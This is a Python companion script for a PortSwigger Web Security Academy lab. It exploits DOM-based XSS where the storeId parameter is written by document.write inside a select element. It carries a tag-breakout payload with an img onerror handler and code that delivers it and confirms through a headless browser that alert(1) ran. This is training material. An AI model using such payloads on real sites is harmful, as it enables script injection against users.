#!/usr/bin/env python3
"""
DOM XSS in document.write sink using source location.search inside a select element
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 10-dom-xss-document-write-sink-inside-select-element.md

What this does:
    The storeId parameter is written by document.write() as a new <option>
    inside a <select> dropdown -- a nested context where a naive "close the
    attribute" payload can land inside the select list and never execute,
    since <select>/<option> parsing is unusually permissive. The payload
    explicitly closes both the <option> and <select> tags before injecting
    a fresh <img onerror> element as ordinary top-level markup. Discovers
    a valid productId from the homepage, delivers the payload, and confirms
    execution with a headless browser.

Usage:
    python 10-dom-xss-document-write-sink-inside-select-element.py <lab-url>
    e.g. python 10-dom-xss-document-write-sink-inside-select-element.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import re
import sys
import urllib.parse
import httpx
from playwright.sync_api import sync_playwright

# Close out of the <option>/<select> nesting before injecting the real payload.
PAYLOAD = "</option></select><img src=1 onerror=alert(1)>"


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")
    session = client.cookies.get("session", "")
    domain = urllib.parse.urlparse(lab_url).netloc

    r = client.get("/")
    prod_ids = re.findall(r"productId=(\d+)", r.text)
    prod_id = prod_ids[0] if prod_ids else "1"
    print(f"[*] Using productId={prod_id}")

    url = f"{lab_url}/product?productId={prod_id}&storeId={urllib.parse.quote(PAYLOAD)}"
    print(f"[*] Payload: {PAYLOAD}")
    print(f"[*] Delivering to: {url}")

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(3000)
        except Exception:
            pass
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() {'fired' if alert_fired else 'did NOT fire'}")

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
